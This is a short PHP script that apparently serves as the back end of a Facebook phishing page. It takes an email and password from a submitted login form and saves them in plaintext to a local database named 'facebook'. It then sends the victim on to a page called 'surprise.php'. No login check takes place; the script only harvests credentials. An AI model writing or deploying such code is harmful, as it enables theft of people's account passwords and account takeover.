<?php
$conn = new mysqli('localhost','root','','facebook');

$email = $_POST['email'];
$password = $_POST['password'];
if($conn->connect_error){
    die("connection failed".$conn->connect_error);
}
else{
    $stmt=$conn->prepare("insert into face(username,pass)value(?,?)");
    $stmt->bind_param("ss",$email,$password);
    $stmt->execute();
    header("location:surprise.php");
    $stmt->close();
    $conn->close();

}
?>










